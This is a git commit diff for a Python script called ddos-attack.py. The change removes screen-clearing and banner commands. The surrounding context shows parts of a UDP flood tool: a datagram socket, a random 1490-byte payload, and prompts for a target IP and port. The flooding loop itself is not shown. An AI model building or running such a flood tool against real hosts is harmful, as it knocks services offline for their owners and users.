00b6ce5e7719580be76412783f91a382e517a79a
LORENZO387 <84094191+LORENZO-387@users.noreply.github.com>
2021-05-21 23:30:19 +0200

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -17,8 +17,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
-os.system("figlet DDos Attack")
+
 print
 print ("""
 .____    ________ _____________________ _______  __________________  ________    _______________ 
@@ -34,8 +33,6 @@ print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
-os.system("clear")
-os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(1)
 print "[=====               ] 25%"
